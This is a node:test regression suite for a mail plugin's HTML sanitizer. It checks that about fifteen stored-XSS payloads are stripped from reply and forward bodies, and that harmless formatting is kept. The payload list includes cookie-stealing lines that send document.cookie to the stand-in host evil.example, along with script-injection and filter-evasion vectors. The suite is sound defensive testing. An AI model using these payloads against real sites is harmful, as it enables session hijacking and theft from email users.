/**
 * Regression suite for the vendored write-side email HTML sanitizer (stored-XSS control).
 *
 * Run standalone:  node marketplace/plugins/mail-server/lib/sanitize-email-html.test.js
 * (node:test; no ts-node needed — this is a plain-JS plugin module.)
 *
 * These assert that hostile Reply/Forward bodies cannot survive to STORAGE. Reverting the
 * sanitize call in index.js (or weakening a rule here) makes a payload survive → a test fails.
 */
'use strict';
const { test } = require('node:test');
const assert = require('node:assert');
const { sanitizeEmailHtml } = require('./sanitize-email-html');

// The four attack shapes the audit item calls out, plus the classic evasions.
const ATTACKS = [
    { name: '<script>',                 html: `<script>alert('xss')</script>` },
    { name: '<img onerror>',            html: `<img src=x onerror="alert(document.cookie)">` },
    { name: '<a href=javascript:>',     html: `<a href="javascript:alert(1)">click</a>` },
    { name: 'style-based exfil',        html: `<div style="background:url('https://evil.example/?c='+document.cookie)">x</div>` },
    { name: 'entity-encoded scheme',    html: `<a href="&#106;avascript:alert(1)">x</a>` },
    { name: 'whitespace-broken scheme', html: `<a href="java\tscript:alert(1)">x</a>` },
    { name: '<style> CSS exfil',        html: `<style>@import url('https://evil.example/c')</style>` },
    { name: '<iframe> js src',          html: `<iframe src="javascript:alert(1)"></iframe>` },
    { name: 'svg onload',               html: `<svg onload="alert(1)"><rect/></svg>` },
    { name: 'noscript mutation',        html: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` },
    { name: 'spliced tag',              html: `<<script>script>alert(1)<</script>/script>` },
    { name: 'body onload attr',         html: `<img src=x/onerror=alert(1)>` },
    { name: 'uppercase SCRIPT',         html: `<SCRIPT>alert(1)</SCRIPT>` },
    { name: 'onmouseover',              html: `<div onmouseover="alert(1)">hover</div>` },
    { name: 'formaction',               html: `<button formaction="javascript:alert(1)">go</button>` },
];

// A rendered string is "clean" when it carries no executable surface: no <script>, no on* handler,
// no javascript:/vbscript:/data:/style-url exfil, no <iframe>/<object>/<embed>/<svg>/<style>.
function assertNoExecutableSurface(rendered, label) {
    const low = rendered.toLowerCase();
    assert.ok(!/<\s*script/.test(low), `${label}: <script> survived → ${rendered}`);
    assert.ok(!/<\s*(iframe|object|embed|svg|math|style|noscript|template)\b/.test(low), `${label}: dangerous element survived → ${rendered}`);
    // No event-handler attribute (on...=) survives.
    assert.ok(!/\son[a-z]+\s*=/.test(low), `${label}: on* handler survived → ${rendered}`);
    // No dangerous URL scheme survives in an attribute.
    assert.ok(!/(?:href|src)\s*=\s*["']?\s*(?:javascript|vbscript|data|file|about|blob):/i.test(rendered), `${label}: dangerous scheme survived → ${rendered}`);
    // The style attribute is dropped wholesale (kills url()/expression exfil).
    assert.ok(!/\sstyle\s*=/.test(low), `${label}: style attribute survived → ${rendered}`);
    // Even entity-decoded, no javascript scheme is reconstructable from a surviving href/src.
    assert.ok(!/javascript/i.test(low.replace(/&#\d+;?/g, '')), `${label}: 'javascript' token survived → ${rendered}`);
}

for (const atk of ATTACKS) {
    test(`stored XSS blocked: ${atk.name}`, () => {
        const out = sanitizeEmailHtml(atk.html);
        assertNoExecutableSurface(out, atk.name);
    });
}

// The whole reply/forward body path: metadata prefix + quoted hostile body, exactly as index.js
// persists it on send (bodyHtml: sanitizeEmailHtml(body)).
test('reply/forward composite body is stored clean', () => {
    const hostileBody = `<p>Hi</p><script>steal()</script><img src=x onerror="fetch('//evil?c='+document.cookie)"><a href="javascript:alert(1)">x</a>`;
    const composed = `<br/>________________________________<br/><strong>From:</strong> attacker<br/><br/>${hostileBody}`;
    const out = sanitizeEmailHtml(composed);
    assertNoExecutableSurface(out, 'composite');
});

// POSITIVE: legitimate basic formatting is PRESERVED so the sanitizer does not break real mail.
test('legitimate formatting survives', () => {
    const out = sanitizeEmailHtml(`<p>Hello <strong>world</strong> and <a href="https://example.com">link</a></p><ul><li>one</li></ul>`);
    assert.match(out, /<strong>world<\/strong>/);
    assert.match(out, /<a href="https:\/\/example\.com">link<\/a>/);
    assert.match(out, /<li>one<\/li>/);
});

// POSITIVE: a safe relative/mailto/tel URL and an http image src survive.
test('safe urls and image src survive', () => {
    const out = sanitizeEmailHtml(`<a href="/inbox">rel</a><a href="mailto:a@b.com">m</a><img src="https://cdn.example/x.png" alt="ok">`);
    assert.match(out, /href="\/inbox"/);
    assert.match(out, /href="mailto:a@b.com"/);
    assert.match(out, /<img src="https:\/\/cdn\.example\/x\.png" alt="ok"\/>/);
});
